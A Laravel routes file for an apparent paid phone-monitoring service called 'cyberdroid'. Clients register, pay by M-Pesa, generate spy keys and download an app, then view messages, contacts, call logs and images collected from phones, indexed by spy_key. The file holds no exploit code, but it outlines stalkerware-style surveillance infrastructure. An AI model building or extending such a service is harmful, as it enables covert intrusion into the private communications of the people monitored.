<?php

use App\Http\Controllers\AdminLoginController;
use App\Http\Controllers\AdminController;
use App\Http\Controllers\CallLogsController;
use App\Http\Controllers\ClientController;
use App\Http\Controllers\ContactController;
use App\Http\Controllers\ImagesController;
use App\Http\Controllers\MessageController;
use App\Http\Controllers\ClientLoginController;
use App\Http\Controllers\MpesaController;
use App\Http\Controllers\ProfileConroller;
use App\Models\CallLogs;
use Illuminate\Support\Facades\Route;

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| contains the "web" middleware group. Now create something great!
|
*/

Route::get('/', function () {
    return view('welcome');
});

//admin authentication
Route::get('admin/login', [AdminLoginController::class, 'admin_show_login'])->name('admin.show.login');
Route::post('admin/login', [AdminLoginController::class, 'admin_login'])->name('admin.login');
Route::get('admin/logout', [AdminLoginController::class, 'admin_logout'])->name('admin.logout');

//admin dashboard
Route::get('dashboard', [AdminController::class, 'dashboard'])->name('dashboard');
//admin users
Route::get('dashboard/users', [AdminController::class, 'users'])->name('dashboard.users.index');
Route::get('dashboard/users/{user_id}', [AdminController::class, 'view_users'])->name('dashboard.users.view');
Route::put('dashboard/add/{user_id}', [AdminController::class, 'add_payment_code'])->name('admin.add.payment');
//admin messages
Route::get('dashboard/messages', [AdminController::class, 'messages'])->name('dashboard.messages.index');
Route::get('dashboard/messages/{spy_key}', [AdminController::class, 'get_messages_by_spy_key'])->name('dashboard.messages.show');
//admin contacts
Route::get('dashboard/contacts', [AdminController::class, 'contacts'])->name('dashboard.contacts.index');
Route::get('dashboard/contacts/{spy_key}', [AdminController::class, 'get_contacts_by_spy_key'])->name('dashboard.contacts.show');
//admin call logs
Route::get('dashboard/call_logs', [AdminController::class, 'call_logs'])->name('dashboard.call_logs.index');
Route::get('dashboard/call_logs/{spy_key}', [AdminController::class, 'get_call_logs_by_spy_key'])->name('dashboard.call_logs.show');
//admin images
Route::get('dashboard/images', [AdminController::class, 'get_images'])->name('dashboard.images.index');
Route::get('dashboard/images/{spy_key}', [AdminController::class, 'get_images_by_spy_key'])->name('dashboard.images.show');


//users authentication
Route::get('user/login', [ClientLoginController::class, 'show_login'])->name('show.login');
Route::post('login', [ClientLoginController::class, 'login'])->name('user.login');
Route::get('user/register', [ClientLoginController::class, 'show_register'])->name('show.register');
Route::post('register', [ClientLoginController::class, 'register'])->name('user.register');
Route::get('logout', [ClientLoginController::class, 'logout'])->name('user.logout');
Route::get('user/forgot_pass', [ClientLoginController::class, 'show_forgot_pass_form'])->name('user.show.forgot_pass_form');
Route::post('forgot_pass', [ClientLoginController::class, 'submit_forgot_pass_form'])->name('user.forgot_submit');
Route::get('user/reset_pass/{token}', [ClientLoginController::class, 'show_reset_pass_form'])->name('user.show.reset_form');
Route::post('reset_pass', [ClientLoginController::class, 'reset_pass'])->name('user.reset_pass');


//client
Route::get('portal', [ClientController::class, 'portal'])->name('portal');
Route::get('setup', [ClientController::class, 'setup'])->name('setup');
Route::put('setup/update/{user_id}', [ClientController::class, 'update_information'])->name('portal.setup.update');
Route::put('setup/generate/{user_id}', [ClientController::class, 'generate_keys'])->name('portal.setup.generate');
Route::post('setup/download/{user_id}', [ClientController::class, 'download_app'])->name('portal.setup.download');
Route::get('mpesa/confirm/show', [ClientController::class, 'show_confirm'])->name('mpesa.confirm.show');
Route::post('mpesa/confirm', [ClientController::class, 'confirm_payment'])->name('mpesa.confirm');

//messages
Route::get('messages/conversation/{phone_number}/{spy_key}', [MessageController::class,'get_conversation'])->name('messages.conversation');
Route::get('messages/{spy_key}', [MessageController::class, 'index'])->name('messages.index');

//contacts
Route::get('contacts/{spy_key}', [ContactController::class,'index'])->name('contacts.index');

//images
Route::get('images/{spy_key}', [ImagesController::class, 'index'])->name('images.index');

//call logs
Route::get('call_logs/{spy_key}', [CallLogsController::class, 'index'])->name('call_logs.index');
Route::get('call_logs/logs/{phone_number}/{spy_key}', [CallLogsController::class, 'get_logs'])->name('call_logs.logs');

//user profile
Route::get('profile/view/{user_id}', [ProfileConroller::class, 'view_profile'])->name('profile.view');
Route::get('profile/edit/{user_id}', [ProfileConroller::class, 'edit_profile'])->name('profile.edit');
Route::put('profile/update/{user_id}', [ProfileConroller::class, 'update_profile'])->name('profile.update');

Route::post('cyberdroid/stk_push', [MpesaController::class, 'mpesa_stk_push'])->name('stk.push');
